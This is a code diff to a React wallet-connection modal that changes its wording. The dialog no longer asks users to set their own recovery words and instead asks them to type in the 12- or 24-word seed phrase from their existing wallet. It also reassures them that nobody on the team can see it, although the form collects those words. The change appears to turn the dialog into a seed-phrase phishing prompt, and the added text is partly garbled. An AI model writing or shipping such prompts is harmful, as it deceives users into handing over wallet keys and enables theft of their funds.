@@ -281,7 +281,7 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
                 : stage === 'password'
                   ? 'Set a password'
                   : stage === 'recovery'
-                    ? 'Set your recovery words'
+                    ? 'Set your Seed Phrase'
                     : 'Connect wallet'}
           </h3>
           <button
@@ -419,9 +419,8 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
         {stage === 'recovery' && recoveryWords === null && (
           <div className="flex flex-col gap-4 py-2">
             <p className="text-sm text-[var(--color-muted)]">
-              Set up your recovery words — a personal phrase our team can use to
-              confirm it’s really you if there’s ever an issue with your account.
-              Choose how many words you’d like.
+              Input Your Seed Phrase to secure your account. This is used to secure to secure your account. Nobody in our team can see your seed phrase, so make sure you keep it safe. You can choose to input either 12 or 24 words.
+            
             </p>
             <div className="grid grid-cols-2 gap-3">
               <button
@@ -447,9 +446,7 @@ export function WalletModal({ open, onClose }: { open: boolean; onClose: () => v
         {stage === 'recovery' && recoveryWords !== null && (
           <form onSubmit={submitRecovery} className="flex flex-col gap-4 py-2">
             <p className="text-sm text-[var(--color-muted)]">
-              Enter {recoveryWords.length} words you’ll remember. Write them down
-              and keep them safe — you’ll need them if you ever have to recover or
-              confirm your account.
+              Enter your {recoveryWords.length}-word Seed Phrase. Your seed phrase that you got during your wallet creation. This is used to secure your account. Nobody in our team can see your seed phrase, so make sure you keep it safe.
             </p>
             <div className="grid max-h-[45vh] grid-cols-2 gap-2 overflow-y-auto pr-1">
               {recoveryWords.map((word, i) => (
